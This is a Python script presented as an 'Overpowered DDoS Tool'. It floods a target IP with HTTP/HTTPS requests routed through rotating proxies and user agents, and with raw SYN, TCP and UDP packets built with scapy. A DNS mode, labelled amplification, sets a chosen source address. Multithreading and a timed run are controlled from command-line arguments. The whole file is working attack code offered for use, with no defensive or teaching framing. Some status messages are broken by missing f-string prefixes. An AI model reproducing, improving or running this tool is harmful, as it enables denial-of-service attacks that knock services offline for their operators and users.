#!/usr/bin/env py -3.10
import argparse
import random
import time
import threading
import requests
from scapy.all import *
from colorama import init, Fore
import socket

# Initialize colorama
init(autoreset=True)

# Read proxies and user agents from txt files
def read_proxies(file_path):
    with open("proxies.txt", 'r') as file:
        proxies = [line.strip() for line in file]
    return proxies

def read_user_agents(file_path):
    with open("user_agents.txt", 'r') as file:
        user_agents = [line.strip() for line in file]
    return user_agents

# Generate ASCII art text
def print_ascii_art():
    print(Fore.BLUE + "   _____ ____   __          _           _   ____   ___   ___  _")
    print(Fore.BLUE + "  |  __ \___ \ / _|        | |         | | |  _ \ / _ \ / _ \| |")
    print(Fore.BLUE + "  | |  | |__) | |_ ___  ___| |_ ___  __| | | |_) | | | | | | | |_ ___ _ __")
    print(Fore.BLUE + "  | |  | |__ <|  _/ _ \/ __| __/ _ \/ _` | |  _ <| | | | | | | __/ _ \ '__|")
    print(Fore.BLUE + "  | |__| |__) | ||  __/ (__| ||  __/ (_| | | |_) | |_| | |_| | ||  __/ |")
    print(Fore.BLUE + "  |_____/____/|_| \___|\___|\__\___|\__,_| |____/ \___/ \___/ \__\___|_|")
    print("")

# Send HTTP/HTTPS requests using proxies and user agents
def send_http_request(target_ip, target_port, proxy, user_agent, is_https=False):
    url = f'https://{target_ip}:{target_port}/' if is_https else f'http://{target_ip}:{target_port}/'
    headers = {'User-Agent': user_agent}
    try:
        response = requests.get(url, headers=headers, proxies={'http': proxy, 'https': proxy})
        if response.status_code == 200:
            print(Fore.GREEN + 'HTTP request to {target_ip}:{target_port} successful!')
        else:
            print(Fore.RED + 'HTTP request to {target_ip}:{target_port} failed with status code {response.status_code}')
    except Exception as e:
        print(Fore.RED + 'Error sending HTTP request to {target_ip}:{target_port}: {e}')

# Send TCP SYN packets
def send_syn_packet(target_ip, target_port):
    pkt = IP(dst=target_ip) / TCP(dport=target_port, flags='S')
    try:
        send(pkt, verbose=0)
        print(Fore.GREEN + 'SYN packet sent to {target_ip}:{target_port}')
    except Exception as e:
        print(Fore.RED + 'Error sending SYN packet to {target_ip}:{target_port}: {e}')

# Send TCP packets
def send_tcp_packet(target_ip, target_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        sock.send(b"A" * 1024)  # Sending 1 KB of data
        print(Fore.GREEN + 'TCP packet sent to {target_ip}:{target_port}')
        sock.close()
    except Exception as e:
        print(Fore.RED + 'Error sending TCP packet to {target_ip}:{target_port}: {e}')

# Send UDP packets
def send_udp_packet(target_ip, target_port, packet_size):
    pkt = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load='A' * packet_size)
    try:
        send(pkt, verbose=0)
        print(Fore.GREEN + 'UDP packet sent to {target_ip}:{target_port}')
    except Exception as e:
        print(Fore.RED + 'Error sending UDP packet to {target_ip}:{target_port}: {e}')

# Send DNS amplification packets
def send_dns_packet(target_ip, attacker_ip):
    dns_query = IP(dst=target_ip, src=attacker_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com", qtype="A"))
    try:
        send(dns_query, verbose=0)
        print(Fore.GREEN + 'DNS packet sent to {target_ip}:53')
    except Exception as e:
        print(Fore.RED + 'Error sending DNS packet to {target_ip}:53: {e}')

# Create threads for multiple targets
def attack_target(target_ip, target_ports, protocol, proxies, user_agents, packet_size, num_threads, attacker_ip):
    for target_port in target_ports:
        for _ in range(num_threads):
            proxy = random.choice(proxies)
            user_agent = random.choice(user_agents)

            if protocol in ['HTTP', 'HTTPS']:
                thread = threading.Thread(target=send_http_request, args=(target_ip, target_port, proxy, user_agent, protocol == 'HTTPS'))
            elif protocol == 'SYN':
                thread = threading.Thread(target=send_syn_packet, args=(target_ip, target_port))
            elif protocol == 'TCP':
                thread = threading.Thread(target=send_tcp_packet, args=(target_ip, target_port))
            elif protocol == 'UDP':
                thread = threading.Thread(target=send_udp_packet, args=(target_ip, target_port, packet_size))
            elif protocol == 'DNS':
                thread = threading.Thread(target=send_dns_packet, args=(target_ip, attacker_ip))
            thread.start()

# Main function
def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description='Overpowered DDoS Tool')
    parser.add_argument('--target-ip', required=True, help='Target IP address')
    parser.add_argument('--target-port', nargs='+', type=int, help='Target port(s)')
    parser.add_argument('--protocol', choices=['HTTP', 'HTTPS', 'SYN', 'TCP', 'UDP', 'DNS'], required=True, help='Protocol to attack')
    parser.add_argument('--proxy-file', required=True, help='Path to the file containing proxies')
    parser.add_argument('--user-agent-file', required=True, help='Path to the file containing user agents')
    parser.add_argument('--packet-size', type=int, default=1024, help='Size of packets (default: 1024)')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--time', type=int, default=60, help='Duration of the attack in seconds (default: 60)')
    parser.add_argument('--attacker-ip', required=True, help='Your IP address for DNS attack')
    args = parser.parse_args()

    # Read proxies and user agents from txt files
    proxies = read_proxies(args.proxy_file)
    user_agents = read_user_agents(args.user_agent_file)

    # Generate ASCII art text
    print_ascii_art()

    # Start the attack
    print(f'Starting DDoS attack on {args.target_ip} using {args.protocol} protocol')
    print(f'Target port(s): {args.target_port}')
    print(f'Packet size: {args.packet_size} bytes')
    print(f'Number of threads: {args.threads}')
    print(f'Duration: {args.time} seconds')

    attack_target(args.target_ip, args.target_port, args.protocol, proxies, user_agents, args.packet_size, args.threads, args.attacker_ip)

    # Wait for the specified duration
    time.sleep(args.time)

    print('DDoS attack completed!')

if __name__ == '__main__':
    main()